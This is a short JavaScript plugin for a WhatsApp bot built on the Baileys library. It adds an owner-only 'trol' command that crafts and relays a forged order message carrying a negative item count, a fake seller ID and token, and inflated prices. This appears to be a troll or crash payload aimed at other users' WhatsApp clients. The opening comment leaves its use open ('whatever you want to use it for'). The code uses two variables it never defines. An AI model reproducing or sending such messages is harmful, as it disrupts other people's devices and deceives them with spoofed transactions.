//terserah buat apa 

import { generateWAMessageFromContent } from "@adiwajshing/baileys"

let handler  = async (m, { conn }) => {
		    const prep = generateWAMessageFromContent(m.chat, { orderMessage: { 
orderId: '7993088630761494',
  thumbnail: thumb,
  itemCount: -77777777,
  status: 1,
  surface: 1,
  message: me,
  orderTitle: 'Mimim-Official',
  sellerJid: '436506665652696@s.whatsapp.net',
  token: '1655878716',
  priceAmount: '666000',
  totalAmount1000: '1000000000',
  totalCurrencyCode: 'IDR',
  contextInfo: null,
}}, { quoted: m })
 await conn.relayMessage(m.chat, prep.message,  { messageId: prep.key.id })

}

handler.command = /^trol$/i
handler.owner = true
export default handler
